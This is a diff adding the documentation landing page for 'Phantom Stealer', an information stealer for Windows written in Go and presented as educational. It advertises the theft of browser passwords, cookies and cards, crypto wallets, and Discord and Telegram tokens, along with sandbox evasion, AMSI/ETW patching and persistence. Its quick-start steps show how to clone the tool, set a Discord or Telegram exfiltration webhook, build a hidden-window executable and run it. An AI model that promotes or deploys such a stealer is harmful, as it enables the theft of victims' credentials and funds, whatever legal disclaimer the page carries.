@@ -1,0 +1,190 @@
+---
+title: Phantom Stealer
+description: A Windows information stealer written in Go for security research and malware analysis
+---
+
+<div className="relative overflow-hidden bg-gradient-to-br from-[#4B0000] via-[#8B0000] to-[#DC143C] py-20">
+  <div className="max-w-6xl mx-auto px-6">
+    <div className="grid lg:grid-cols-12 gap-8 items-center">
+      <div className="lg:col-span-8">
+        <h1 className="text-5xl md:text-6xl font-bold text-white mb-6">
+          Phantom Stealer
+        </h1>
+        <p className="text-xl text-gray-100 max-w-2xl mb-8">
+          Educational security research tool demonstrating Windows credential extraction techniques, anti-analysis evasion, and data exfiltration patterns used by modern information stealers.
+        </p>
+        <div className="flex flex-wrap gap-4">
+          <a
+            href="/quickstart"
+            className="inline-flex items-center px-6 py-3 bg-white text-[#8B0000] font-semibold rounded-lg hover:bg-gray-100 transition-colors"
+          >
+            Get Started
+          </a>
+          <a
+            href="/modules/browsers"
+            className="inline-flex items-center px-6 py-3 border border-white/30 bg-white/10 text-white font-semibold rounded-lg hover:bg-white/20 transition-colors"
+          >
+            Explore Modules
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div className="mt-16 mb-16 max-w-5xl mx-auto px-6">
+  <div className="mb-16">
+    <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
+      Educational purposes only
+    </h2>
+    <p className="text-base text-gray-600 dark:text-gray-400 mb-6">
+      This software is provided for educational and research purposes only. It demonstrates how modern information stealers operate to help security researchers understand attack vectors and develop better defensive measures.
+    </p>
+    
+    <Warning>
+      **Legal Notice:** Using this tool against systems you do not own or have explicit written permission to test is illegal and unethical. The author(s) accept NO responsibility for misuse of this software. By downloading or using this software, you agree to use it ONLY on systems you own or have written authorization to test.
+    </Warning>
+  </div>
+
+  <div className="mb-16">
+    <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
+      Key capabilities
+    </h2>
+    <p className="text-base text-gray-600 dark:text-gray-400 mb-8">
+      Phantom Stealer demonstrates a comprehensive set of credential theft and evasion techniques
+    </p>
+
+    <CardGroup cols={2}>
+      <Card title="Browser credentials" icon="browser" href="/modules/browsers">
+        Extract passwords, cookies, credit cards, and autofill data from Chrome, Edge, Brave, Firefox, Opera, and more using DPAPI and AES-GCM decryption
+      </Card>
+      <Card title="Crypto wallets" icon="wallet" href="/modules/wallets">
+        Target 40+ desktop and browser extension wallets including Exodus, MetaMask, Phantom, Electrum, and Bitcoin Core
+      </Card>
+      <Card title="Token grabbing" icon="key" href="/modules/tokens">
+        Extract Discord tokens, Telegram sessions, and Steam credentials from local storage databases
+      </Card>
+      <Card title="Anti-analysis" icon="shield-halved" href="/modules/evasion">
+        Detect VMs, debuggers, and sandboxes using techniques like VM artifact checks, timing analysis, and AMSI/ETW patching
+      </Card>
+      <Card title="Reconnaissance" icon="magnifying-glass" href="/modules/reconnaissance">
+        Gather system information, capture screenshots, monitor clipboard, and extract WiFi passwords
+      </Card>
+      <Card title="Persistence" icon="clock" href="/modules/persistence">
+        Implement multiple persistence mechanisms including Registry Run keys, Startup folders, Scheduled Tasks, and WMI subscriptions
+      </Card>
+      <Card title="Exfiltration" icon="cloud-arrow-up" href="/modules/exfiltration">
+        Exfiltrate stolen data via Discord webhooks and Telegram bots with automatic ZIP archive creation
+      </Card>
+      <Card title="Configuration" icon="gear" href="/configuration/settings">
+        Modular configuration system with toggleable features and extensive target definitions
+      </Card>
+    </CardGroup>
+  </div>
+
+  <div className="mb-16">
+    <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
+      Quick start
+    </h2>
+    <p className="text-base text-gray-600 dark:text-gray-400 mb-8">
+      Get up and running with Phantom Stealer in minutes
+    </p>
+
+    <Steps>
+      <Step title="Clone the repository">
+        Download the source code from GitHub
+        ```bash
+        git clone https://github.com/1rhino2/phantom-stealer.git
+        cd phantom-stealer
+        ```
+      </Step>
+
+      <Step title="Configure your settings">
+        Edit `config/config.go` to set your webhook URLs and enable/disable features
+        ```go
+        var (
+            DiscordWebhook = "https://discord.com/api/webhooks/xxxxx/yyyyy"
+            TelegramToken  = ""
+            TelegramChatID = ""
+        )
+        ```
+      </Step>
+
+      <Step title="Build the executable">
+        Compile with Go 1.21+ on Windows
+        ```bash
+        # Standard build
+        go build -o phantom.exe .
+
+        # Production build (smaller, no debug symbols)
+        go build -ldflags "-s -w -H windowsgui" -o phantom.exe .
+        ```
+      </Step>
+
+      <Step title="Run for testing">
+        Execute on a test system you own
+        ```bash
+        ./phantom.exe
+        ```
+        <Note>
+          Data will be exfiltrated to your configured Discord webhook or Telegram bot
+        </Note>
+      </Step>
+    </Steps>
+  </div>
+
+  <div className="mb-16">
+    <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
+      Technical architecture
+    </h2>
+    <p className="text-base text-gray-600 dark:text-gray-400 mb-8">
+      Written in pure Go with minimal dependencies for maximum portability
+    </p>
+
+    <CardGroup cols={3}>
+      <Card title="Browsers module" icon="code" href="/modules/browsers">
+        Chromium and Firefox password extraction with DPAPI decryption
+      </Card>
+      <Card title="Wallets module" icon="code" href="/modules/wallets">
+        Desktop and extension wallet file extraction
+      </Card>
+      <Card title="Tokens module" icon="code" href="/modules/tokens">
+        LevelDB parsing for Discord/Telegram tokens
+      </Card>
+      <Card title="Evasion module" icon="code" href="/modules/evasion">
+        VM detection, debugger checks, AMSI/ETW patching
+      </Card>
+      <Card title="Recon module" icon="code" href="/modules/reconnaissance">
+        System info gathering and file collection
+      </Card>
+      <Card title="Exfil module" icon="code" href="/modules/exfiltration">
+        ZIP creation and webhook transmission
+      </Card>
+    </CardGroup>
+  </div>
+</div>
+
+<div className="bg-[#1a1d27] dark:bg-[#1a1d27] border-t border-[#27272a] dark:border-[#27272a] py-16 mt-16">
+  <div className="max-w-5xl mx-auto px-6 text-center">
+    <h2 className="text-3xl font-bold text-gray-900 dark:text-white mb-4">
+      Ready to explore?
+    </h2>
+    <p className="text-base text-gray-600 dark:text-gray-400 mb-8 max-w-2xl mx-auto">
+      Learn how information stealers work and develop better security defenses
+    </p>
+    <div className="flex flex-wrap justify-center gap-4">
+      <a
+        href="/quickstart"
+        className="inline-flex items-center px-6 py-3 bg-[#8B0000] text-white font-semibold rounded-lg hover:bg-[#DC143C] transition-colors"
+      >
+        Get Started
+      </a>
+      <a
+        href="/security/legal"
+        className="inline-flex items-center px-6 py-3 border border-[#27272a] dark:border-[#27272a] bg-transparent text-gray-900 dark:text-white font-semibold rounded-lg hover:bg-[#242838] dark:hover:bg-[#242838] transition-colors"
+      >
+        Legal Notice
+      </a>
+    </div>
+  </div>
+</div>
